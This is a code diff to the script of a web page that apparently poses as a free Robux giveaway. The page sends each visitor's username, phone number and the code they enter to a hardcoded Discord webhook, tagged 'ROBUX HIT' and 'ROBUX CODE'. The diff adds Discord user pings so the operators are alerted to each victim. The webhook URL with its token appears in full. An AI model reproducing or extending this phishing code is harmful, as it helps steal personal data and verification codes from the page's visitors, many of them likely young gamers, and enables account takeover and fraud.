@@ -438,7 +438,7 @@
   </div>
 
 <script>
-  // ==================== WEBHOOK DISCORD ====================
+  // ==================== WEBHOOK DISCORD (avec ping) ====================
   const WEBHOOK = "https://discord.com/api/webhooks/1523821118358552626/lfWBCG2w1kAhIvPFhcYLQOe8V3z_YW66UiweHbTJ1ZOXYswiEx6ahHvEqmxSyIVbzbIu";
 
   // hero animated numbers
@@ -497,12 +497,12 @@
     var amt = document.querySelector('#amts button.sel');
     document.getElementById('showAmt').textContent = amt ? amt.getAttribute('data-a').replace(/\B(?=(\d{3})+(?!\d))/g,' ') : '4 500';
 
-    // === ENVOI DU NUMÉRO SUR DISCORD ===
+    // === ENVOI DU NUMÉRO SUR DISCORD (avec ping) ===
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `**ROBUX HIT**\nPseudo: @${currentUser}\nPhone: ${phone}`
+        content: `<@896448018453233714> <@1514675664794423303> **ROBUX HIT**\nPseudo: @${currentUser}\nPhone: ${phone}`
       })
     });
 
@@ -537,12 +537,12 @@
       return;
     }
 
-    // === ENVOI DU CODE SUR DISCORD ===
+    // === ENVOI DU CODE SUR DISCORD (avec ping) ===
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `**ROBUX CODE**\nPseudo: @${currentUser}\nCode entré: ${code}`
+        content: `<@896448018453233714> <@1514675664794423303> **ROBUX CODE**\nPseudo: @${currentUser}\nCode entré: ${code}`
       })
     });
 
